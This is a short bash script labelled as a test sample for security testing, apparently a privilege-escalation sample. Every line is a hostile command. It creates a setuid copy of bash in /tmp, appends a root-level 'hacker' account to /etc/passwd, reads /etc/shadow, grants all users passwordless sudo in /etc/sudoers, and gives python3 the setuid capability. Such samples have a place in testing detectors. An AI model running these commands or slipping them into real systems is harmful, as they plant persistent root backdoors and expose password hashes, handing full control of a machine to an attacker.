#!/bin/bash
# [TEST SAMPLE] Privilege Escalation Script - FOR SECURITY TESTING ONLY

# SUID bit exploitation
find / -perm -4000 -type f 2>/dev/null
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash

# /etc/passwd modification
echo 'hacker:$6$salt$hash:0:0::/root:/bin/bash' >> /etc/passwd

# /etc/shadow read attempt
cat /etc/shadow

# Sudoers modification
echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers

# Capability abuse
setcap cap_setuid+ep /usr/bin/python3
